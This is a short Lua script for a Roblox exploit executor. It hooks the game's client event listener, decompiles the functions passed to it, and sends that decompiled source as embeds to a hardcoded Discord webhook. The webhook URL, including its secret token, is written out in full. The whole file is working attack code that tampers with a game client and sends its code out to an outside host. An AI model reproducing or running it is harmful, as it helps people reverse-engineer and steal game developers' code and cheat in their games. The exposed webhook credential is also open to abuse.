local HttpService = game:GetService("HttpService")
local Webhook = "https://discord.com/api/webhooks/1324084236558532701/QhbB-OUxaScbiaItK9N71Ew5X6iWWsfd2nkPyVBzv5XGV4RppWumNOYyqXh5cmKTuPN1"

function send(msg,name)
	pcall(request({
		Url = Webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = HttpService:JSONEncode({
			embeds = {{
				description = msg,
				color = 3066993,
				author = {
					name = name
				}
			}}
		})
	}))
end

local Events = require(game.ReplicatedStorage.Events)

hookfunction(Events.ClientListen, function(v1,v2)
	local status, result = pcall(function()
		local Proto = debug.getproto(v2, 1)
		send("```"..decompile(Proto).."```",v1)
	end)
	
	if not status then
		print(result)
	end
	return Events.ClientListen
end)
